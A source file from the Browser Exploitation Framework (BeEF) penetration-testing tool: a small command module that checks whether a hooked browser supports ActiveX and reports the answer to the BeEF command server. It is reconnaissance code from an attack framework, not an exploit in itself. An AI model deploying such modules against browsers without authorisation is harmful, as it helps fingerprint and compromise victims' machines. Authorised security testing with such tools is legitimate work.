//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var result = (beef.browser.hasActiveX())? "Yes" : "No";

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "activex="+result);

});

